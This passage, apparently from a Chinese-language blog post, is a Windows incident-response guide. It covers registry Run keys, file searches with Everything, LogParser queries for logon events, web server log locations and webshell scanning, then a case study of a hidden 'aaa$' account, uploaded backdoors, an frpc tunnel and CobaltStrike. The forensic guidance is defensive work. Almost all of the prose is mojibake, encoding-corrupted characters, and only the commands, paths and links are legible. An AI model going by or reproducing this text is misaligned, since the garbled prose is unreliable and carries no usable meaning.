æ‰“å¼€æ³¨å†Œè¡¨ï¼Œé€ä¸€æ’æŸ¥å¯ç–‘å¯åŠ¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure></div><p>1ï¼‰ç”¨æˆ·è®¾ç½®çš„å¯åŠ¨é¡¹æ˜¯æ’æŸ¥çš„é‡ç‚¹ï¼Œè‹¥å³è¾¹å‡ºç°å¯ç–‘çš„å¯åŠ¨é¡¹åˆ™å¯å¯¹å…¶æ’æŸ¥ï¼Œè¯¥åˆ é™¤åä¸å½±å“ç³»ç»Ÿè¿è¡Œã€‚</p><p>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025100525020.png" data-caption="image-20231025100525020"><img src="/../images/emergency/windows/image-20231025100525020.png" alt="image-20231025100525020"></a></p><p>2ï¼‰ç³»ç»Ÿè®¾ç½®çš„å¯åŠ¨é¡¹ï¼Œä¸€èˆ¬æ˜¯ç¬¬ä¸‰æ–¹è½¯ä»¶çš„é©±åŠ¨ç¨‹åºï¼Œè°¨æ…åˆ é™¤ï¼Œå¯èƒ½ä¼šå¯¹ç³»ç»Ÿé€ æˆå½±å“ã€‚</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025140852741.png" data-caption="image-20231025140852741"><img src="/../images/emergency/windows/image-20231025140852741.png" alt="image-20231025140852741"></a></p><p>3ï¼‰ç³»ç»Ÿå¯åŠ¨é¡¹ï¼Œè¯¥é”®è·¯å¾„ç”¨äºåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åªè¿è¡Œä¸€æ¬¡çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œè¯¥é”®è·¯å¾„ä¸‹çš„æ¡ç›®ä¼šè¢«è‡ªåŠ¨åˆ é™¤</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025141525824.png" data-caption="image-20231025141525824"><img src="/../images/emergency/windows/image-20231025141525824.png" alt="image-20231025141525824"></a></p><h3 id="3-5-å¯ç–‘æ–‡ä»¶æ’æŸ¥"><a href="#3-5-å¯ç–‘æ–‡ä»¶æ’æŸ¥" class="headerlink" title="3.5 å¯ç–‘æ–‡ä»¶æ’æŸ¥"></a>3.5 å¯ç–‘æ–‡ä»¶æ’æŸ¥</h3><p>ä¸€èˆ¬æ‰‹æ³•çš„ web ç«¯æ”»å‡»è·å– webshell æˆ–è¿›è¡Œåæ¸—é€æ—¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¼šç”Ÿæˆç›¸å…³çš„è½åœ°æ–‡ä»¶ï¼Œé€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬å¯¹ç›¸åº”çš„æ—¶é—´æ®µå†…çš„æ–‡ä»¶è¿›è¡Œæ’é™¤å³å¯ï¼Œè‹¥å·²ç»è¿›è¡Œäº†åæ¸—é€éšè—äº†å¦è¯´ã€‚</p><p>è¿™è¾¹ä½¿ç”¨ everything è¿›è¡Œæ’é™¤ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.voidtools.com/zh-cn/downloads/%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%8C%E6%90%9C%E7%B4%A2%E6%97%B6%E9%97%B4%E4%BB%8E2023%E5%B9%B410%E6%9C%8824%E6%97%A5-2023%E5%B9%B410%E6%9C%8825%E6%97%A5%E5%86%85%E6%96%B0%E5%BB%BA%E7%9A%84">https://www.voidtools.com/zh-cn/downloads/ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼Œæœç´¢æ—¶é—´ä»2023å¹´10æœˆ24æ—¥-2023å¹´10æœˆ25æ—¥å†…æ–°å»ºçš„</a> .exeã€.batã€.vbsã€.jspã€.jarã€.dll æ–‡ä»¶ï¼Œå‘½ä»¤æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dm:2023/10/24-2023/10/25 *.exe|*.bat|*.vbs|*.jsp</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025173133344.png" data-caption="image-20231025173133344"><img src="/../images/emergency/windows/image-20231025173133344.png" alt="image-20231025173133344"></a></p><h3 id="3-6-æ—¥å¿—åˆ†æ"><a href="#3-6-æ—¥å¿—åˆ†æ" class="headerlink" title="3.6 æ—¥å¿—åˆ†æ"></a>3.6 æ—¥å¿—åˆ†æ</h3><p>æ—¥å¿—åˆ†æï¼Œä¸»è¦å¯¹æœåŠ¡å™¨ä¸»æœºæ—¥å¿—ã€web æ—¥å¿—ã€å®‰å…¨è®¾å¤‡æ—¥å¿—è¿›è¡Œæ’é™¤å®¡è®¡ã€‚</p><blockquote><p>æœåŠ¡å™¨ä¸»æœºæ—¥å¿—</p></blockquote><p>å…·ä½“ä½ç½®ä¸Šè¿°å·²æœ‰è¯´æ˜ï¼Œè¿™é‡Œä¸åœ¨é˜è¿°ï¼Œè¿™è¾¹ä½¿ç”¨ FullEventLogView å·¥å…·ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.nirsoft.net/utils/full_event_log_view.html">https://www.nirsoft.net/utils/full_event_log_view.html</a> ä»¥åŠ LogParser å·¥å…·ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a> è¿›è¡Œåˆ†æã€‚</p><p>1ï¼‰full_event_log_view ï¼Œä½¿ç”¨è¯¥å·¥å…·ï¼Œåªéœ€è¦å°† .evtx æ—¥å¿—æ”¾ç½®åœ¨æŸä¸€æ–‡ä»¶å¤¹å†…ï¼Œå‹¾é€‰ç›¸å…³åŠŸèƒ½å³å¯å¯è§†åŒ–æ˜¾ç¤ºæ—¥å¿—ä¿¡æ¯ã€‚</p><p>å‹¾é€‰ Option ä¸­çš„ Show Event String In Columns å±•ç¤ºæ›´å¤šçš„äº‹ä»¶ä¿¡æ¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026100728024.png" data-caption="image-20231026100728024"><img src="/../images/emergency/windows/image-20231026100728024.png" alt="image-20231026100728024"></a></p><p>full_event_log_view é»˜è®¤æ˜¾ç¤ºçš„æ—¶é—´ä¸º 7 å¤©ï¼Œè‹¥æƒ³è¦æ˜¾ç¤ºå…¶å®ƒæ—¶é—´éœ€è¦ï¼Œéœ€è¦åœ¨ Option ä¸­çš„ Advanced Option ä¸­å¦é€‰æ‹©</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101103645.png" data-caption="image-20231026101103645"><img src="/../images/emergency/windows/image-20231026101103645.png" alt="image-20231026101103645"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101149371.png" data-caption="image-20231026101149371"><img src="/../images/emergency/windows/image-20231026101149371.png" alt="image-20231026101149371"></a></p><p>ç„¶åå°†éœ€è¦åˆ†æçš„ .evtx æ—¥å¿—æ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹å¦‚ System.evtxã€Security.evtxã€Application.evtxï¼Œç­‰å¾…åŠ è½½å®Œæ—¥å¿—ï¼Œå³å¯å¯è§†åŒ–æŸ¥çœ‹æ—¥å¿—è®°å½•</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101544532.png" data-caption="image-20231026101544532"><img src="/../images/emergency/windows/image-20231026101544532.png" alt="image-20231026101544532"></a></p><p>è‹¥æƒ³è¦å®šç‚¹åˆ†æï¼Œå¯åœ¨ Option ä¸­çš„ Advance Option è®¾ç½®æŸ¥çœ‹ç‰¹å®šçš„äº‹ä»¶æˆ–è¿‡æ»¤æŸå…³é”®å­—</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101812556.png" data-caption="image-20231026101812556"><img src="/../images/emergency/windows/image-20231026101812556.png" alt="image-20231026101812556"></a></p><p>2ï¼‰LogParser ï¼Œå¾®è½¯å®˜æ–¹ç»å…¸çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œæ¯”è¾ƒéº»çƒ¦å°±æ˜¯éœ€è¦è‡ªå·±è¾“å…¥æŸ¥è¯¢å‘½ä»¤ï¼Œä¸‹è½½å®‰è£…å®Œååœ¨å®‰è£…è·¯å¾„ä¸‹ cmd æ‰“å¼€ç„¶åæ‰§è¡Œå‘½ä»¤ï¼Œå³å¯å¯è§†åŒ–æŸ¥çœ‹å…·ä½“çš„äº‹ä»¶<strong>ï¼ˆæ³¨æ„ä¸‹åˆ—çš„å‘½ä»¤ä¸­çš„æ—¥å¿—è·¯å¾„éœ€æ›¿æ¢ä¸ºè‡ªå·±éœ€è¦åˆ†æçš„æ—¥å¿—è·¯å¾„ï¼‰</strong></p><ul><li>ç›´æ¥æ˜¾ç¤ºç³»ç»Ÿæ—¥å¿—å…¨éƒ¨å†…å®¹ï¼Œä¸ä½œç­›é€‰</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT * FROM D:\Software\LogParser\logs\Security.evtx&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104201653.png" data-caption="image-20231026104201653"><img src="/../images/emergency/windows/image-20231026104201653.png" alt="image-20231026104201653"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104223691.png" data-caption="image-20231026104223691"><img src="/../images/emergency/windows/image-20231026104223691.png" alt="image-20231026104223691"></a></p><ul><li>æŸ¥çœ‹ç™»å½•æˆåŠŸçš„æ‰€æœ‰äº‹ä»¶ï¼ŒEvent ID ä¸º 4624</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026102932775.png" data-caption="image-20231026102932775"><img src="/../images/emergency/windows/image-20231026102932775.png" alt="image-20231026102932775"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026102444810.png" data-caption="image-20231026102444810"><img src="/../images/emergency/windows/image-20231026102444810.png" alt="image-20231026102444810"></a></p><ul><li>æŸ¥çœ‹æŒ‡å®šç™»å½•æ—¶é—´èŒƒå›´çš„äº‹ä»¶, 2023-10-01 23:32:11 - 2023-10-26 23:34:00</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where TimeGenerated&gt;&#x27;2023-10-01 23:32:11&#x27; and TimeGenerated&lt;&#x27;2023-10-26 23:34:00&#x27; and EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026103107776.png" data-caption="image-20231026103107776"><img src="/../images/emergency/windows/image-20231026103107776.png" alt="image-20231026103107776"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026103228699.png" data-caption="image-20231026103228699"><img src="/../images/emergency/windows/image-20231026103228699.png" alt="image-20231026103228699"></a></p><ul><li>æå–ç™»å½•æˆåŠŸçš„ç”¨æˆ·åå’Œ IP</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT  â€“o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM D:\Software\LogParser\logs\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure></div><ul><li>æŸ¥çœ‹ç™»å½•å¤±è´¥çš„æ‰€æœ‰äº‹ä»¶ï¼ŒEvent ID ä¸º 4625</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT *  FROM D:\Software\LogParser\logs\Security.evtx where EventID=4625&quot;</span><br></pre></td></tr></table></figure></div><ul><li>æå–ç™»å½•å¤±è´¥ç”¨æˆ·åè¿›è¡Œèšåˆç»Ÿè®¡</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM D:\Software\LogParser\logs\Security.evtx where EventID=4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure></div><ul><li>ç³»ç»Ÿå†å²å¼€å…³æœºè®°å½•</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT â€“o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM D:\Software\LogParser\logs\Security.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure></div><p>3ï¼‰å®‰å…¨å¼€æºå°å·¥å…· â€œwindowsæ—¥å¿—ä¸€é”®åˆ†æå°å·¥å…·â€ , Github åœ°å€ ï¼š<a href="https://github.com/dogadmin/windodws-logs-analysis#windows%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E4%BC%9A%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8">https://github.com/dogadmin/windodws-logs-analysis#windowsï¼Œè¯¥å·¥å…·ä¼šè°ƒç”¨ç³»ç»Ÿè¿›ç¨‹ï¼Œå»ºè®®ä½¿ç”¨</a> windowslog-local.exe åœ¨è™šæ‹Ÿæœºä½¿ç”¨ï¼Œå³å°†æœåŠ¡å™¨æ—¥å¿—æ‹·è´åœ¨ c ç›˜åœ¨æ–°å»º log æ–‡ä»¶å¤¹ï¼Œç„¶åç‚¹å‡»éœ€è¦åˆ†æçš„åŠŸèƒ½å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026105038015.png" data-caption="image-20231026105038015"><img src="/../images/emergency/windows/image-20231026105038015.png" alt="image-20231026105038015"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026104714454.png" data-caption="image-20231026104714454"><img src="/../images/emergency/windows/image-20231026104714454.png" alt="image-20231026104714454"></a></p><blockquote><p>ä¸­é—´ä»¶WEBæ—¥å¿—</p></blockquote><p>åœ¨æœåŠ¡å™¨ç«¯ï¼Œç›¸åº”çš„ä¸­é—´ä»¶è‹¥å¼€å¯å¹¶è®¾ç½®ç›¸å…³çš„æ—¥å¿—è®°å½•ï¼Œåˆ™ä¼šå¯¹è®°å½•ç³»ç»Ÿç›¸åº”çš„è¯·æ±‚ä¿¡æ¯æˆ–è¿è¡ŒæŠ¥é”™ã€‚</p><p>1ã€Apache Tomcat æ—¥å¿—ï¼Œä¸€èˆ¬å­˜æ”¾åœ¨ tomcat ç›®å½•ä¸‹çš„ logs æ–‡ä»¶å¤¹ä¸­ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026210234378.png" data-caption="image-20231026210234378"><img src="/../images/emergency/windows/image-20231026210234378.png" alt="image-20231026210234378"></a></p><p>2ã€Nginx æ—¥å¿—ï¼Œä¸€èˆ¬äº¦ä¼šå­˜æ”¾åœ¨ nginx ç›®å½•ä¸‹çš„ logs æ–‡ä»¶å¤¹ä¸­ï¼Œä¸»è¦æŸ¥çœ‹ access.log è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œè®°å½•æ‰€æœ‰çš„HTTPè¯·æ±‚ä¿¡æ¯ã€‚</p><p>å’Œ error.log é”™è¯¯æ—¥å¿—æ–‡ä»¶ï¼Œè®°å½•NginxæœåŠ¡å™¨çš„é”™è¯¯å’Œè­¦å‘Šä¿¡æ¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026210841866.png" data-caption="image-20231026210841866"><img src="/../images/emergency/windows/image-20231026210841866.png" alt="image-20231026210841866"></a></p><p>3ã€IIS æ—¥å¿—ï¼Œä¸€èˆ¬å­˜æ”¾åœ¨ %SystemDrive%\inetpub\logs\LogFilesï¼Œå…¶ä¸­ï¼Œ<code>%SystemDrive%</code> è¡¨ç¤ºç³»ç»Ÿå®‰è£…çš„é©±åŠ¨å™¨ï¼ˆé€šå¸¸æ˜¯ C:\ï¼‰åœ¨ <code>LogFiles</code> ç›®å½•ä¸‹ï¼Œä½ ä¼šæ‰¾åˆ°å¤šä¸ªå­ç›®å½•ï¼Œæ¯ä¸ªå­ç›®å½•å¯¹åº”ä¸€ä¸ªç½‘ç«™æˆ–åº”ç”¨ç¨‹åºçš„æ—¥å¿—æ–‡ä»¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026213145485.png" data-caption="image-20231026213145485"><img src="/../images/emergency/windows/image-20231026213145485.png" alt="image-20231026213145485"></a></p><h3 id="3-7-æœ¨é©¬æŸ¥æ€"><a href="#3-7-æœ¨é©¬æŸ¥æ€" class="headerlink" title="3.7 æœ¨é©¬æŸ¥æ€"></a>3.7 æœ¨é©¬æŸ¥æ€</h3><p>1ï¼‰webshell æŸ¥æ€ï¼Œåœ¨ Windows ä¸‹çš„åº”æ€¥æŸ¥æ€ä¸­ï¼Œåœ¨æœåŠ¡å™¨ç«¯æ²¡æœ‰å…¶å®ƒçš„ edr æ—¶å€™ï¼Œé’ˆå¯¹ Webshell çš„æŸ¥æ€ï¼Œè€æœ‹å‹ â€œDç›¾â€ ä¾ç„¶æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©,ä¸‹è½½åœ°å€ï¼š<a href="https://www.d99net.net/">https://www.d99net.net/</a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026105914781.png" data-caption="image-20231026105914781"><img src="/../images/emergency/windows/image-20231026105914781.png" alt="image-20231026105914781"></a></p><p>è¯¥å·¥å…·çš„å¥½å¤„å°±æ˜¯é™¤äº†é’ˆå¯¹ webshell çš„æŸ¥æ€ï¼Œè¿˜æœ‰ç›¸å…³çš„è¾…åŠ©åŠŸèƒ½ååŠ©åº”æ€¥äººå‘˜è¿›è¡Œæ’æŸ¥ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026110133831.png" data-caption="image-20231026110133831"><img src="/../images/emergency/windows/image-20231026110133831.png" alt="image-20231026110133831"></a></p><h3 id="3-8-å®‰å…¨è®¾å¤‡æ’æŸ¥"><a href="#3-8-å®‰å…¨è®¾å¤‡æ’æŸ¥" class="headerlink" title="3.8 å®‰å…¨è®¾å¤‡æ’æŸ¥"></a>3.8 å®‰å…¨è®¾å¤‡æ’æŸ¥</h3><p>ç”±äºä¸åŒçš„å•ä½è´­ä¹°çš„å®‰å…¨è®¾å¤‡ä¸ä¸€ï¼Œæœ‰äº›å•ä½åªæœ‰å•ä¸€çš„é˜²ç«å¢™ä½œä¸ºå®‰å…¨é˜²æŠ¤ï¼Œæ‰€ä»¥æ­¤æ­¥éª¤åº”å……åˆ†äº†è§£å®¢æˆ·ç°åœºçš„å®‰å…¨è®¾å¤‡æƒ…å†µï¼Œè‹¥æœ‰ç›¸åº”çš„æ€åŠ¿ã€å…¨æµé‡ã€EDR ç­‰å®‰å…¨è®¾å¤‡å¯é€šè¿‡è¿™äº›è®¾å¤‡è¿›è¡Œè¾…åŠ©æ’æŸ¥ï¼Œå°½å¯èƒ½çš„è·å–æ›´å¤šçš„ä¿¡æ¯ã€‚</p><h3 id="3-9-å°ç»“"><a href="#3-9-å°ç»“" class="headerlink" title="3.9 å°ç»“"></a>3.9 å°ç»“</h3><p>ä»¥ä¸Šå°±æ˜¯é’ˆå¯¹ windwos æœåŠ¡å™¨ç«¯çš„åŸºæœ¬å…¥ä¾µæ’æŸ¥æ‰‹æ³•ï¼Œå½“ç„¶ä¸Šé¢ç«¯å£ã€è¿›ç¨‹ã€å¯åŠ¨é¡¹ç­‰çš„æ’æŸ¥äº¦å¯é€šè¿‡ <strong>ç«ç»’å‰‘</strong> å»è¿›è¡Œè¾…åŠ©æ’æŸ¥ï¼Œä½¿ç”¨ä¼˜ç§€çš„å·¥å…·å¯æœ€å¤§ç¨‹åº¦å‡è½»åº”æ€¥äººå‘˜çš„å·¥ä½œåŠè´Ÿæ‹…ã€‚ç«ç»’å‰‘ç‹¬ç«‹ç‰ˆä¸‹è½½åœ°å€ï¼š<a href="https://www.52pojie.cn/thread-1358296-1-1.html">https://www.52pojie.cn/thread-1358296-1-1.html</a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026213742994.png" data-caption="image-20231026213742994"><img src="/../images/emergency/windows/image-20231026213742994.png" alt="image-20231026213742994"></a></p><h2 id="å››ã€æ¡ˆä¾‹"><a href="#å››ã€æ¡ˆä¾‹" class="headerlink" title="å››ã€æ¡ˆä¾‹"></a>å››ã€æ¡ˆä¾‹</h2><p>æŸæ¬¡æ¼”ç»ƒæœŸé—´æŸå•ä½æ¥åˆ°ä¸Šçº§é€šæŠ¥ï¼Œè¯¥å•ä½è¢«æ”»å‡»é˜Ÿè·å–ç›¸åº”æƒé™ï¼Œéœ€åœ¨è§„å®šæ—¶é—´å†…å¯¹å•ä½æ¶‰äº‹ä¸»æœºè¿›è¡Œæ’æŸ¥ï¼Œå¹¶ä¸Šäº¤ç›¸å…³æŠ¥å‘Šã€‚ä»»åŠ¡è½¬è¾—è‡³æ­¤ï¼Œæ¥åˆ°åº”æ€¥ä»»åŠ¡åï¼Œåœ¨åˆ°è¾¾ç°åœºå‰å·²ç»å¤§æ¦‚äº†è§£äº‹æƒ…çš„ç»è¿‡ï¼Œè¢«å…¥ä¾µç½‘ç«™ä¸ºæŸå¤–ç½‘å•ä½éƒ¨é—¨ç½‘ç«™, æ”»å‡»è€…åˆ©ç”¨æ¼æ´ä¸Šä¼ åé—¨æœ¨é©¬ã€‚äºæ˜¯åˆ°è¾¾ç°åœºåä¾¿å¼€å±•ç›¸å…³çš„å…¥ä¾µæ’æŸ¥ã€‚</p><h3 id="4-1-æœåŠ¡å™¨æ’æŸ¥"><a href="#4-1-æœåŠ¡å™¨æ’æŸ¥" class="headerlink" title="4.1 æœåŠ¡å™¨æ’æŸ¥"></a>4.1 æœåŠ¡å™¨æ’æŸ¥</h3><blockquote><p> æ£€æŸ¥ç³»ç»Ÿç”¨æˆ·æƒ…å†µ</p></blockquote><p>é€šè¿‡æ’æŸ¥å‘ç°æœåŠ¡å™¨å­˜åœ¨éšè—è´¦å· <code>aaa$</code>ï¼Œå³å½“å­˜åœ¨ $ ç»“å°¾çš„ç”¨æˆ·åæ—¶åœ¨ CMD ç»ˆç«¯ä½¿ç”¨å‘½ä»¤ <code>net user</code> æ— æ³•æ˜¾ç¤ºè¯¥ç”¨æˆ·ï¼Œè‹¥åªé€šè¿‡ç»ˆç«¯å‘½ä»¤æ’æŸ¥ï¼Œè€Œæ²¡æœ‰è¿›ä¸€æ­¥æ’æŸ¥åˆ™ä¼šé”™å¤±é‡è¦ä¿¡æ¯ï¼Œåˆ›å»ºæ—¶é—´ä¸º5æœˆ25æ—¥10:40:35ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/1-16983297055661.png" data-caption="1"><img src="/../images/emergency/windows/1-16983297055661.png" alt="1"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/2-16983297854053.png" data-caption="2"><img src="/../images/emergency/windows/2-16983297854053.png" alt="2"></a></p><blockquote><p> æ’æŸ¥å¼‚å¸¸æ–‡ä»¶</p></blockquote><p>é€šè¿‡æ’æŸ¥ï¼Œå‘ç°5æœˆ23æ—¥ï¼Œç³»ç»Ÿå­˜åœ¨é»‘å®¢å…¥ä¾µç—•è¿¹ï¼ŒæœŸé—´é»‘å®¢ä¸æ–­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œå¹¶æˆåŠŸä¸Šä¼ å¤šä¸ªåé—¨æœ¨é©¬æ–‡ä»¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/3-16983299211735.png" data-caption="3"><img src="/../images/emergency/windows/3-16983299211735.png" alt="3"></a></p><p>å¯¹æœ¨é©¬ç›®å½•è·Ÿè¿›æ’æŸ¥ï¼Œå‘ç°åœ¨ç›¸è¿‘æ—¶é—´å†…æ”»å‡»è€…è¿›è¡Œäº†å¤§é‡çš„å°è¯•æ”»å‡»ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/4-16983299788567.png" data-caption="4"><img src="/../images/emergency/windows/4-16983299788567.png" alt="4"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/5-16983300520589.png" data-caption="5"><img src="/../images/emergency/windows/5-16983300520589.png" alt="5"></a></p><p>è·Ÿè¿›éƒ¨åˆ†æœ¨é©¬æ ·æœ¬ï¼Œæ‰“å¼€æŸ¥çœ‹ï¼Œå·²ç›¸å½“æ¸…æ™°æ˜äº†</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026222642682.png" data-caption="image-20231026222642682"><img src="/../images/emergency/windows/image-20231026222642682.png" alt="image-20231026222642682"></a></p><blockquote><p>ç«¯å£ã€è¿›ç¨‹æ’æŸ¥</p></blockquote><p>é€šè¿‡æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°ç³»ç»Ÿå­˜åœ¨ frpc.exeè¿›ç¨‹ï¼Œæ”»å‡»è€…é€šè¿‡è¯¥è½¯ä»¶å¯¹å†…ç½‘èµ„æºè¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œå®ç°æ¨ªå‘æ¸—é€æ“ä½œã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/12-169833082231513.png" data-caption="12"><img src="/../images/emergency/windows/12-169833082231513.png" alt="12"></a></p><p>å®šä½æ–‡ä»¶è·¯å¾„ä¸º <code>D:\Product\Home\UploadFile\2022\frpc.exe</code>ï¼Œé€šè¿‡æ”»å‡»è€…ä¸Šä¼ çš„frpè½¯ä»¶ï¼ŒæŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶å®šä½åˆ°æ”»å‡»è€…æœåŠ¡å™¨ IP</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026223658311.png" data-caption="image-20231026223658311"><img src="/../images/emergency/windows/image-20231026223658311.png" alt="image-20231026223658311"></a></p><h3 id="4-2-å®‰å…¨è®¾å¤‡æ’æŸ¥"><a href="#4-2-å®‰å…¨è®¾å¤‡æ’æŸ¥" class="headerlink" title="4.2 å®‰å…¨è®¾å¤‡æ’æŸ¥"></a>4.2 å®‰å…¨è®¾å¤‡æ’æŸ¥</h3><p>ç”±äºå·²çŸ¥é“å·²è¢«ä¸Šä¼ æœ¨é©¬ï¼Œç°åœºæœ‰ç›¸åº”çš„å®‰å…¨è®¾å¤‡ï¼Œé€šè¿‡å®‰å…¨è®¾å¤‡è¿›è¡Œæ—¥å¿—æ’æŸ¥ã€‚å®‰å…¨è®¾å¤‡ä¸Šæ£€æµ‹åˆ°5æœˆ25æ—¥å¸¦æœ‰æ”»å‡»è®°å½•ï¼Œé€šè¿‡æ­¤å‰ä¸Šä¼ çš„æ–‡ä»¶ t.5.aspx è¯·æ±‚å†…ç½‘èµ„æºã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/9-169833063593511.png" data-caption="9"><img src="/../images/emergency/windows/9-169833063593511.png" alt="9"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/10-169833109274215.png" data-caption="10"><img src="/../images/emergency/windows/10-169833109274215.png" alt="10"></a></p><p>åç»­ä½¿ç”¨ CobaltStrike è¿›è¡Œåæ¸—é€æ“ä½œã€‚</p><p><a data-fancybox="gallery" 